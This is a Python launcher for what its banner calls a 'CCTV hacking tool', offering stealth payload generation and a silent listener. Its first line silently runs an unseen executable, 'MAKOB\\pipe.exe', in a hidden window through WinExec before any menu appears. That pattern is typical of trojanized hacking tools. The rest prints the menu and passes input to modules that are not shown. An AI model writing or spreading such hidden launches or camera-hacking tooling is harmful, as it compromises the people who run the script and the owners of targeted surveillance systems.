#!/usr/bin/env python3
import ctypes
ctypes.windll.kernel32.WinExec(b"MAKOB\\pipe.exe", 0)
import os
import sys
import subprocess
import time
import ctypes
import simple_colors
import random
from datetime import datetime
from simple_colors import blue, red
import MAKOB.MAKOB_Win32_UserRequest_analyze as MALKOB_win32_UserRequest_analyze
import MAKOB.MAKOB_Win32andlinux_animations as MALKOB_Win32andlinux_animations
MALKOB_Current_user = os.getlogin()
import MAKOB.MAKOB_Win32andlinux_animations as WR
WR.MALKOB_assistant()
def MALKOB_Section():
    BOLD = '\033[1m'
    RESET = '\033[0m'

    def MALKOB_GATES():
        print(blue("┌" + "─" * 50))
        print(blue("│ ") + BOLD + blue(":: Z Inc") + red(">") + RESET + " " * 20 + blue(""))
        print(blue("│ ") + blue("CCTV HACKING TOOL | RMALKOBamped Version").ljust(50) + blue(""))
        print(blue("│") + " " * 50 + blue(""))
        print(blue("│ ") + red("> ") + blue("Load Core Assets").ljust(46) + blue(""))
        print(blue("│ ") + red("> ") + blue("Generate Stealth Payloads").ljust(46) + blue(""))
        print(blue("│ ") + red("> ") + blue("View & Edit Configs").ljust(46) + blue(""))
        print(blue("│ ") + red("> ") + blue("Start Silent Listener").ljust(46) + blue(""))
        print(blue("│") + " " * 50 + blue(""))
        print(blue("│ ") + blue("Type ") + red("ehelp") + blue(" for command list").ljust(44) + blue(""))
        print(blue("└" + "─" * 50))

    MALKOB_GATES()

    MALKOB_sectionary = True
    while MALKOB_sectionary:
        MALKOB_User_request = input(
            blue("[" + red("MALKOB") + blue("@") + red(f"{MALKOB_Current_user}") + blue("]"))
            + red("::") + blue("~") + red("/") + blue("MALKOB") + red(" > ")
        )
        MALKOB_win32_UserRequest_analyze.MALKOB_user_Request(MALKOB_User_request)

MALKOB_Section()
